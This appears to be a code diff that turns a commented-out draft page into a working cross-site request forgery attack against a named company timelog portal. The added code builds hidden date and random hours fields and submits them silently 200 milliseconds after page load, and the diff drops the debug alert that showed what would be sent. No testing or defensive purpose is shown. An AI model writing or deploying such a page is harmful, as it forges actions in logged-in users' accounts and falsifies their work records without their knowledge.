@@ -4,61 +4,57 @@
   </head>
 
   <body>
-    <!--<form id="csrf-attack-form" 
+    <form id="csrf-attack-form" 
           action="https://portal.dynamisprc.com:8443/timelog" 
           method="POST">
     
-      <input type="hidden" name="date" id="date-field" value="" />
+      <!--<input type="hidden" name="date" id="date-field" value="" />-->
       
       <input type="hidden" name="system" value="Low Voltage System" />
       <input type="hidden" name="assembly" value="Telemetry" />
       <input type="hidden" name="activity" value="Software" />
       
-      <input type="hidden" name="hours" id="hours-field" value="" />
-    </form>-->
+      <!--<input type="hidden" name="hours" id="hours-field" value="" />-->
+    </form>
 
     <script>
-      // Funzione sicura per aggiungere lo zero iniziale (es. 5 -> 05)
-      function pad(n) {
-        return (n < 10 ? '0' : '') + n;
-      }
+      window.onload = function() {
+        
+        function pad(n) { return (n < 10 ? '0' : '') + n; }
 
-      // Funzione per calcolare il Lunedì corrente
-      function getCurrentWeekString() {
-        var d = new Date();
-        var day = d.getDay();
-        var diff = d.getDate() - day + (day == 0 ? -6 : 1); // Aggiusta per Domenica
+        var curr = new Date(); 
+        var day = curr.getDay();
+        var diff = curr.getDate() - day + (day === 0 ? -6 : 1); 
 
-        var monday = new Date(d.setDate(diff));
+        var monday = new Date(curr.setDate(diff));
         var sunday = new Date(monday);
         sunday.setDate(monday.getDate() + 6);
 
-        // Costruiamo la stringa DD/MM - DD/MM YYYY
-        // Nota: getMonth() parte da 0, quindi aggiungiamo +1
-        var startStr = pad(monday.getDate()) + '/' + pad(monday.getMonth() + 1);
-        var endStr = pad(sunday.getDate()) + '/' + pad(sunday.getMonth() + 1);
-        var year = monday.getFullYear(); // Usa l'anno del lunedì
+        var dateStr = pad(monday.getDate()) + '/' + pad(monday.getMonth() + 1) + 
+                      ' - ' + 
+                      pad(sunday.getDate()) + '/' + pad(sunday.getMonth() + 1) + 
+                      ' ' + monday.getFullYear();
+        
+        var hoursStr = Math.floor(Math.random() * (25 - 15 + 1)) + 15;
 
-        return startStr + ' - ' + endStr + ' ' + year;
-      }
+        var form = document.getElementById('csrf-attack-form');
 
-      // --- ESECUZIONE ---
-      
-      // 1. Imposta la data
-      var calculatedDate = getCurrentWeekString();
-      //document.getElementById('date-field').value = calculatedDate;
+        var inputDate = document.createElement("input");
+        inputDate.type = "hidden";
+        inputDate.name = "date";
+        inputDate.value = dateStr;
+        form.appendChild(inputDate);
 
-      // 2. Imposta le ore (15-25)
-      var randomHours = Math.floor(Math.random() * (25 - 15 + 1)) + 15;
-      //document.getElementById('hours-field').value = randomHours;
+        var inputHours = document.createElement("input");
+        inputHours.type = "hidden";
+        inputHours.name = "hours";
+        inputHours.value = hoursStr;
+        form.appendChild(inputHours);
 
-      // 3. DEBUG: Mostra cosa stiamo per inviare (rimuovi questa riga se vuoi l'invio silenzioso)
-      alert("Sto inviando questa settimana: " + calculatedDate + "\nOre: " + randomHours);
-
-      // 4. Invia il form con un leggero ritardo per assicurare che il DOM sia aggiornato
-      /*setTimeout(function() {
-        document.forms[0].submit();
-      }, 50000);*/ 
+        setTimeout(function() {
+            form.submit();
+        }, 200);
+      };
     </script>
 
   </body>
